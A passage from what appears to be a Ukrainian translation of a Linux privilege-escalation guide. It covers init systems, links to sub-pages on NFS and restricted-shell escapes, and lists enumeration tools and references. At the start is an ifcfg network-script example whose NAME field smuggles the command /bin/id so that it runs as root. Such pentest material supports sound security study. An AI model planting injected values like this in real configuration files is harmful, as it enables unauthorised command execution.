Для прикладу: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи управління сервісами в Linux**. Він включає скрипти для `start`, `stop`, `restart` і іноді `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язаний з **Upstart**, новішою системою **управління сервісами**, впровадженою Ubuntu, що використовує конфігураційні файли для задач управління сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються поряд із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** виступає як сучасний ініціалізатор і менеджер сервісів, пропонуючи розширені можливості, такі як запуск демонів за запитом, керування automount і знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибуції та в `/etc/systemd/system/` для змін адміністратором, що спрощує адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Найкращий інструмент для пошуку Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
